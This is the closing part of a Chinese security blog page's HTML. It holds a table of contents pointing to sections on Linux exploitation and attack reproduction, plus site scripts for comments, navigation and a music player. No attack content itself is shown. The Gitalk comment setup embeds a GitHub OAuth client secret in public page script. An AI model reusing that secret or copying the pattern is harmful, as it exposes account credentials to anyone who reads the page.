利用（Linux）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%AE%9E%E6%88%98%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.7.</span> <span class="toc-text">七、实战复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2 目标应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.7.3.</span> <span class="toc-text">7.3 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C"><span class="toc-number">1.7.4.</span> <span class="toc-text">7.4 复现结果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file%E5%8D%95%E9%98%B6%E6%AE%B5"><span class="toc-number">1.7.4.1.</span> <span class="toc-text">file单阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fd%E4%B8%A4%E9%98%B6%E6%AE%B5"><span class="toc-number">1.7.4.2.</span> <span class="toc-text">fd两阶段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">八、总结</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2017 - 2026 By Y5neKO</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div><div class="footer_custom_text">行走于黑白之间.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/blog/js/utils.js?v=5.5.1"></script><script src="/blog/js/main.js?v=5.5.1"></script><script src="/blog/js/tw_cn.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  const initGitalk = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGitalk = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const gitalk = new Gitalk({
+      clientID: '4d2d58bafea4c026b68f',
+      clientSecret: '61a3976d66520d7bfd80d2de0e9e60fe31820603',
+      repo: 'blog',
+      owner: 'Y5neKO',
+      admin: ['Y5neKO'],
+      updateCountCallback: commentCount,
+      ...option,
+      id: isShuoshuo ? path : (option && option.id) || '017b4860de70b694ce8d36b76e3aae38'
+    })
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async(el, path) => {
+    if (typeof Gitalk === 'function') initGitalk(el, path)
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js')
+      initGitalk(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Gitalk' === 'Gitalk'
+      ? window.shuoshuoComment = { loadComment: loadGitalk }
+      : window.loadOtherComment = loadGitalk
+    return
+  }
+
+  if ('Gitalk' === 'Gitalk' || !false) {
+    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><script>window.newestComments = {
+  changeContent: content => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<code>.*?<\/code>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g, "") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0, 150) + '...'
+    }
+    return content
+  },
+
+  generateHtml: (array, ele) => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class="aside-list-item">'
+
+        if (false && array[i].avatar) {
+          const imgAttr = 'data-lazy-src'
+          const lazyloadNative = ''
+          result += `<a href="${array[i].url}" class="thumbnail"><img ${imgAttr}="${array[i].avatar}" alt="${array[i].nick}" ${lazyloadNative}></a>`
+        }
+
+        result += `<div class="content">
+        <a class="comment" href="${array[i].url}" title="${array[i].content}">${array[i].content}</a>
+        <div class="name"><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '暂无评论'
+    }
+
+    ele.innerHTML = result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh(ele)
+  },
+
+  newestCommentInit: (name, getComment) => {
+    const $dom = document.querySelector('#card-newest-comments .aside-list')
+    if ($dom) {
+      const data = btf.saveToLocal.get(name)
+      if (data) {
+        newestComments.generateHtml(JSON.parse(data), $dom)
+      } else {
+        getComment($dom)
+      }
+    }
+  },
+
+  run: (name, getComment) => {
+    newestComments.newestCommentInit(name, getComment)
+    btf.addGlobalFn('pjaxComplete', () => newestComments.newestCommentInit(name, getComment), name)
+  }
+}</script><script>window.addEventListener('load', () => {
+  const keyName = 'github-newest-comments'
+  const { changeContent, generateHtml, run } = window.newestComments
+
+  const findTrueUrl = (array, ele) => {
+    Promise.all(array.map(item =>
+      fetch(item.url).then(resp => resp.json()).then(data => {
+        let urlArray = data.body ? data.body.match(/(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?/ig) : []
+        if (!Array.isArray(urlArray) || urlArray.length === 0) {
+          urlArray = [`${data.html_url}`]
+        }
+        if (data.user.login === 'utterances-bot') {
+          return urlArray.pop()
+        } else {
+          return urlArray.shift()
+        }
+      })
+    )).then(res => {
+        array = array.map((i,index)=> {
+          return {
+            ...i,
+            url: res[index]
+          }
+        })
+
+        btf.saveToLocal.set(keyName, JSON.stringify(array), 3/(60*24))
+        generateHtml(array, ele)
+    });
+  }
+
+  const getComment = ele => {
+    fetch('https://api.github.com/repos/Y5neKO/blog/issues/comments?sort=updated&direction=desc&per_page=3&page=1',{
+      "headers": {
+        Accept: 'application/vnd.github.v3.html+json'
+      }
+    })
+      .then(response => response.json())
+      .then(data => {
+        const githubArray = data.map(item => {
+          return {
+            'avatar': item.user.avatar_url,
+            'content': changeContent(item.body_html || item.body),
+            'nick': item.user.login,
+            'url': item.issue_url,
+            'date': item.updated_at
+          }
+        })
+        findTrueUrl(githubArray, ele)
+      }).catch(e => {
+        console.error(e)
+        ele.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+  }
+  run(keyName, getComment)
+})</script><div class="aplayer no-destroy" data-id="2102314888" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-mini="true"> </div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      true
+        ? (usePjax ? pjax.loadUrl('/blog/404.html') : window.location.href = '/blog/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/blog/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>
